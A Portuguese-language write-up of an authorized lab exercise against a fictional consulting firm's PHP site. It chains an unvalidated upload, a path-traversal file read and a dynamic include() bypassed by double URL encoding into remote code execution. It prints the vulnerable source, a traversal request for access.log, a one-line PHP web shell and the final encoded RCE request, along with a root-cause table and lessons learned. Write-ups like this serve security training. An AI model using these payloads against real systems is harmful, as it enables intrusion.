<div width="1223" height="447" alt="image" src="" /><div align="center">

# 🔓 Sumace Consulting GmbH — From LFI to RCE

![Category](https://img.shields.io/badge/Category-Web%20Exploitation-critical)
![Vuln](https://img.shields.io/badge/Vuln-LFI%20%7C%20Path%20Traversal%20%7C%20RCE-red)
![Status](https://img.shields.io/badge/Status-Completed-success)
![Lang](https://img.shields.io/badge/Docs-PT--BR-blue)

*Encadeando um upload aparentemente inofensivo com um `include()` mal protegido para alcançar execução remota de código.*

</div>

---

## 📑 Índice

- [Visão Geral](#-visão-geral)
- [Cadeia de Exploração](#-cadeia-de-exploração)
- [1. Reconhecimento](#1-reconhecimento)
- [2. Identificando o LFI](#2-identificando-o-lfi)
- [3. Por que Log Poisoning não funcionou](#3-por-que-log-poisoning-não-funcionou)
- [4. O mecanismo de upload](#4-o-mecanismo-de-upload)
- [5. A segunda primitiva: `include()`](#5-a-segunda-primitiva-include)
- [6. Bypass via Double URL Encoding](#6-bypass-via-double-url-encoding)
- [7. Upload do payload PHP](#7-upload-do-payload-php)
- [8. Encadeando tudo: Path Traversal + include()](#8-encadeando-tudo-path-traversal--include)
- [9. RCE confirmado](#9-rce-confirmado)
- [10. Root Cause](#10-root-cause)
- [Lições Aprendidas](#-lições-aprendidas)
- [Skills Demonstradas](#-skills-demonstradas)
- [Disclaimer Ético](#️-disclaimer-ético)

---

## 🎯 Visão Geral

Durante o assessment da aplicação web da **Sumace Consulting GmbH**, o objetivo era construir uma cadeia de exploração capaz de resultar em **Remote Code Execution (RCE)**.

A vulnerabilidade final não veio de um único ponto óbvio, mas da combinação de falhas que, isoladamente, pareciam de baixo impacto:

- **File Upload** sem validação real de tipo de conteúdo
- **Local File Inclusion / Arbitrary File Read** em um endpoint de imagens
- **`include()` dinâmico** em outro endpoint, controlado por parâmetro de usuário
- **Bypass de sanitização** via Double URL Encoding

> <img src="https://i.imgur.com/9Q4wnRA.png"/>

---

## 🔗 Cadeia de Exploração

```text
File Upload (/apply.php)
     ↓
Arquivo PHP armazenado em /uploads/<MD5>.<ext>
     ↓
LFI identificado em /api/image.php (mas sem include, sem RCE direto)
     ↓
include() identificado em /contact.php (parâmetro region)
     ↓
Bypass de validação com Double URL Encoding (%252e%252e%252f)
     ↓
Path Traversal → ../uploads/<MD5>.php
     ↓
PHP interpreta o arquivo enviado
     ↓
RCE via parâmetro cmd
```

---

## 1. Reconhecimento

A aplicação expunha um formulário de candidatura em `/apply.php`, com campos para nome, sobrenome, e-mail, currículo (PDF) e observações. O envio era processado por `/api/application.php`.

O parâmetro `n` em `thanks.php?n=<valor>` chamou atenção por ser refletido na resposta (`Thanks for applying, <valor>!`), mas não havia indício de que fosse usado em operações de inclusão ou execução e foi descartado como vetor principal.

> <img src="https://i.imgur.com/IUbMjJU.png"/>

---

## 2. Identificando o LFI

O endpoint `/api/image.php`, com o parâmetro `p`, aceitava traversal:

```http
GET /api/image.php?p=....//....//....//....//....//....//....//../var/log/nginx/access.log
```

A resposta retornou o conteúdo de `/var/log/nginx/access.log`, confirmando **Local File Inclusion / Arbitrary File Read**.

> <img src="https://i.imgur.com/jAXBiYn.png"/>

---

## 3. Por que Log Poisoning não funcionou

Com acesso de leitura ao `access.log`, a primeira hipótese foi **Log Poisoning**: injetar PHP no `User-Agent` e recuperá-lo via LFI.

O código-fonte de `image.php` (obtido através do próprio LFI) revelou o motivo pelo qual essa via não levava a RCE:

```php
<?php
if (isset($_GET["p"])) {
    $path = "../images/" . str_replace("../", "", $_GET["p"]);
    $contents = file_get_contents($path);
    header("Content-Type: image/jpeg");
    echo $contents;
}
?>
```

O uso de `file_get_contents()` seguido de `echo` apenas **exibe** o conteúdo do arquivo como texto, não há interpretação PHP. Um payload como `<?php system($_GET['cmd']); ?>` injetado no log seria apenas impresso na tela, nunca executado.

**Conclusão parcial:** LFI confirmado, mas sem caminho direto para RCE por esse endpoint.

---

## 4. O mecanismo de upload

A análise de `/api/application.php` revelou:

```php
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>
```

Dois detalhes tornaram esse ponto interessante:

- A extensão final vem diretamente do nome enviado pelo cliente (`$ext`), sem validação de tipo real.
- O nome do arquivo é o **MD5 do próprio conteúdo** (`md5_file($tmp_name)`), o que significa que, sabendo o conteúdo enviado, é possível calcular o caminho final do arquivo antes mesmo de fazer o upload.

Isso permite enviar um arquivo `.php` malicioso e prever exatamente onde ele será salvo: `/uploads/<MD5>.php`.

> <img src="https://i.imgur.com/vEkKdFr.png"/>

---

## 5. A segunda primitiva: `include()`

O endpoint `/contact.php` trouxe a peça que faltava:

```php
$region = "AT";
$danger = false;

if (isset($_GET["region"])) {
    if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
        echo "'region' parameter contains invalid character(s)";
        $danger = true;
    } else {
        $region = urldecode($_GET["region"]);
    }
}

if (!$danger) {
    include "./regions/" . $region . ".php";
}
```

Diferente do `file_get_contents()` visto antes, aqui há um `include()` e se for possível controlar o caminho, qualquer arquivo PHP alcançável será **interpretado**, não apenas exibido.

---

## 6. Bypass via Double URL Encoding

A validação bloqueava `.` e `/` no valor bruto do parâmetro, mas essa checagem ocorria **antes** de um segundo `urldecode()`:

```php
$region = urldecode($_GET["region"]);
```

Isso criava uma divergência entre o valor validado e o valor efetivamente usado no `include()`. Enviando o payload já URL-encoded uma vez, o valor analisado pela validação não continha `.` nem `/`, mas após o `urldecode()` interno da aplicação, os caracteres perigosos reapareciam.

```text
%252e%252e%252f
       ↓ (decode do parâmetro pela camada HTTP)
%2e%2e%2f
       ↓ (passa na validação — sem "." ou "/" literais)
       ↓ (urldecode() da aplicação)
../
```

---

## 7. Upload do payload PHP

Um arquivo PHP com uma interface simples de execução de comandos foi enviado através de `/apply.php`. O upload resultou em algo como:

```text
/uploads/<MD5_DO_CONTEUDO>.php
```

Com o conteúdo enviado sob controle, o hash e portanto o caminho final pôde ser calculado previamente.

---

## 8. Encadeando tudo: Path Traversal + include()

Como `/contact.php` concatenava `.php` automaticamente ao valor de `region`, o objetivo era fazer:

```php
include "./regions/" . $region . ".php";
```

resolver para:

```text
./regions/../uploads/<MD5>.php
```

O payload final, com Double URL Encoding:

```http
GET /contact.php?region=%252e%252e%252fuploads%252f<MD5>
```

Após as duas camadas de decodificação, o caminho efetivo passou a ser `./regions/../uploads/<MD5>.php`, e o PHP interpretou o arquivo enviado anteriormente.

---

## 9. RCE Confirmado

Com o arquivo sendo interpretado, o payload expunha um parâmetro `cmd` para execução de comandos no contexto do processo web:

```text
/contact.php?region=%252e%252e%252fuploads%252f<MD5>&cmd=<comando>
```

Um comando de identificação de usuário confirmou que os comandos eram executados no servidor, fechando a cadeia:

```text
Upload → LFI → Double Encoding → Path Traversal → include() → RCE
```

A partir da execução remota, foi possível enumerar o diretório raiz do sistema de arquivos e localizar a flag do exercício (conteúdo omitido neste write-up por política de divulgação responsável).

> <img src="https://i.imgur.com/ndOaFTR.png"/>

---

## 10. Root Cause

| Falha | Descrição |
|---|---|
| **Arbitrary File Upload** | Extensão definida pelo cliente (`$ext`), sem validação de tipo real de conteúdo |
| **Path Traversal** | `region` usado diretamente na construção de um caminho de `include()` |
| **Unsafe URL Decoding** | `urldecode()` aplicado *depois* da validação de caracteres perigosos |
| **Dynamic PHP Include** | `include()` com dado influenciado por entrada do usuário transforma um LFI/upload em RCE |

Nenhuma dessas falhas isoladamente seria crítica; a combinação delas foi o que permitiu a cadeia completa.

---

## 💡 Lições Aprendidas

O ponto central deste exercício foi entender que **nem todo LFI resulta automaticamente em RCE**. O acesso ao `access.log` parecia promissor para Log Poisoning, mas a leitura do código-fonte mostrou que o endpoint apenas **exibia** o conteúdo (`file_get_contents` + `echo`), sem jamais interpretá-lo.

A oportunidade real surgiu ao correlacionar dois pontos aparentemente independentes da aplicação: um endpoint de upload com nome de arquivo previsível, e um `include()` em outro endpoint totalmente distinto. A validação de path traversal parecia sólida à primeira vista, mas a ordem das operações (`validar` → `decodificar`) abriu espaço para o bypass via Double URL Encoding.

**Takeaway metodológico:** ao encontrar um LFI, sempre mapear *todos* os pontos de leitura/inclusão de arquivo da aplicação, a primitiva de execução muitas vezes está em outro lugar, não no endpoint onde o LFI foi descoberto.

---

## 🧠 Skills Demonstradas

- Enumeração e análise de endpoints web
- Identificação de Local File Inclusion / Arbitrary File Read
- Leitura e interpretação de código-fonte PHP obtido via LFI
- Diferenciação entre leitura de arquivo (`file_get_contents`) e inclusão executável (`include()`)
- Exploração de Arbitrary File Upload com previsão de nome de arquivo (MD5-based)
- Bypass de validação de input via Double URL Encoding
- Encadeamento de múltiplas vulnerabilidades de baixo impacto isolado em uma cadeia crítica (RCE)
- Uso de Burp Suite para manipulação de encoding em requisições HTTP

---

## ⚠️ Disclaimer Ético

Este write-up documenta uma atividade realizada em ambiente de laboratório autorizado, com fins exclusivamente educacionais. Nenhuma técnica aqui descrita deve ser aplicada contra sistemas sem autorização explícita. Flags, credenciais e demais dados sensíveis do exercício foram omitidos ou redigidos intencionalmente.
